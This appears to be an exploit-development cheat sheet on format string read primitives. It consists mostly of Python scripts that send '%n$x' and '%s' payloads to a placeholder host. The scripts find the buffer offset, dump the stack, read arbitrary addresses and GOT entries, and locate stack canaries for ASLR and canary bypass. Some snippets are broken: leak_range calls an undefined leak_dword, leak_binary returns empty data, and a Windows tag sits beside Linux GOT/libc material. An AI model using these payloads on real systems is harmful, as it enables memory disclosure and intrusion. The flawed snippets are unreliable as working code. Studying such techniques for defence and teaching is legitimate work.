---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - Format_String
  - Windows
---

## Format String Read Primitives
resources: [Format String Attacks](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

> Use format strings to leak stack contents and memory for **ASLR** bypass.

### Leak Stack Values
> Read DWORDs from stack.

```python
# Leak multiple stack values
payload = b"AAAA" + b".%08x" * 30
# Output: AAAA.value1.value2.value3...

# Specific position
payload = b"%7$08x"  # Leak 7th DWORD
```

### Find Buffer Position
> Determine where input lands on stack.

```python
import socket

def find_position(host, port):
    """Find stack position containing our input"""
    for i in range(1, 50):
        s = socket.socket()
        s.connect((host, port))
        payload = f"AAAA%{i}$08x\n".encode()
        s.send(payload)
        response = s.recv(1024).decode()
        s.close()

        if "41414141" in response:
            print(f"Input at position {i}")
            return i

    return None

position = find_position("<TargetIP>", <Port>)
```

### Leak Specific Address
> Read memory at arbitrary address.

```python
import struct

def leak_memory(sock, addr, position):
    """Leak DWORD at arbitrary address using %s"""
    # Place address at known position, use %s to read string there
    payload = struct.pack("<I", addr)
    payload += f"%{position}$s".encode()
    sock.send(payload + b"\n")
    response = sock.recv(1024)
    # Address bytes followed by string at that address
    return response[4:]  # Skip the address we sent
```

### Leak Multiple DWORDs
> Read range of memory.

```python
def leak_range(sock, start_addr, count, position):
    """Leak multiple DWORDs"""
    leaked = b""
    for i in range(count):
        addr = start_addr + (i * 4)
        data = leak_dword(sock, addr, position)
        leaked += data
        print(f"0x{addr:08x}: {data.hex()}")
    return leaked
```

### Leak Return Address for ASLR Bypass
> Find saved return address to calculate base.

```python
# Stack typically contains return addresses
# Leak values and identify module addresses

def find_return_addr(host, port):
    """Leak stack to find return address"""
    s = socket.socket()
    s.connect((host, port))

    # Leak many stack values
    payload = b".%08x" * 50 + b"\n"
    s.send(payload)
    response = s.recv(4096).decode()
    s.close()

    # Parse leaked values
    values = response.split(".")
    for i, val in enumerate(values):
        if val.startswith("0x") or len(val) == 8:
            try:
                addr = int(val, 16)
                # Check if looks like code address
                if 0x10000000 <= addr <= 0x7FFFFFFF:
                    print(f"Position {i}: 0x{addr:08x}")
            except:
                pass
```

### Leak GOT Entry
> Read GOT to find libc base.

```python
# GOT contains resolved function addresses
# Leak to calculate libc base

GOT_PRINTF = 0x08049000  # Example GOT entry

payload = struct.pack("<I", GOT_PRINTF)
payload += f"%{position}$s".encode()

# Response contains printf's real address
# Calculate libc base: printf_real - printf_offset
```

### Leak Stack Canary
> Read canary for later bypass.

```python
# Stack canary usually near saved EBP
# Leak stack values to find it

# Canary characteristics:
# - Ends with NULL byte (0x00)
# - Random on each run
# - Same throughout process

def find_canary(host, port):
    """Identify potential stack canary"""
    s = socket.socket()
    s.connect((host, port))

    payload = b".%08x" * 100 + b"\n"
    s.send(payload)
    response = s.recv(4096)
    s.close()

    values = response.split(b".")
    for i, val in enumerate(values):
        try:
            v = int(val, 16)
            # Canary often ends in 00
            if v & 0xFF == 0x00 and v != 0:
                print(f"Potential canary at {i}: 0x{v:08x}")
        except:
            pass
```

### Parse Leaked Data
> Extract useful information from leaks.

```python
def parse_leak(response, markers):
    """Extract known structures from leaked data"""
    results = {}

    # Find marker positions
    for name, pattern in markers.items():
        idx = response.find(pattern)
        if idx != -1:
            results[name] = idx

    return results

# Example: Finding vtable pointer
markers = {
    'vtable': b'\x00\x10\x40',  # Common vtable prefix
    'canary': b'\x00',           # Canary ends in NULL
}
```

### Automated Stack Dump
> Comprehensive stack leak.

```python
def dump_stack(host, port, count=100):
    """Dump stack contents via format string"""
    s = socket.socket()
    s.connect((host, port))

    payload = b"STACK:" + b"|%08x" * count + b"\n"
    s.send(payload)
    response = s.recv(8192).decode()
    s.close()

    # Parse
    start = response.find("STACK:") + 6
    values = response[start:].split("|")

    print("Stack dump:")
    for i, val in enumerate(values):
        if val and len(val) >= 8:
            print(f"  [{i:3d}] 0x{val[:8]}")
```

### Handle Non-Printable Leaks
> Read binary data safely.

```python
# %s stops at NULL bytes
# For binary data, use %x word by word

def leak_binary(sock, addr, size, position):
    """Leak binary data containing NULLs"""
    data = b""
    for i in range(0, size, 4):
        # Read DWORD at addr+i
        payload = struct.pack("<I", addr + i)
        payload += f"%{position}$08x".encode()
        # Parse hex response back to bytes
        # ...
    return data
```

### Leak Format String Position Finder
> Tool to map stack layout.

```python
#!/usr/bin/env python3
import socket
import struct

def map_stack(host, port, max_pos=100):
    """Map stack via format string, find input position"""

    print(f"Mapping stack for {host}:{port}")

    for pos in range(1, max_pos):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((host, port))

            # Send marker + positional read
            payload = f"AAAA%{pos}$08x\n".encode()
            s.send(payload)
            resp = s.recv(1024).decode(errors='ignore')
            s.close()

            # Check for our marker
            if "41414141" in resp:
                print(f"[*] Input found at position {pos}")
                return pos
            else:
                # Print what we found
                # Extract the hex value after AAAA
                if "AAAA" in resp:
                    val = resp.split("AAAA")[1][:8]
                    print(f"Position {pos}: {val}")

        except Exception as e:
            print(f"Position {pos}: Error - {e}")

    return None
```

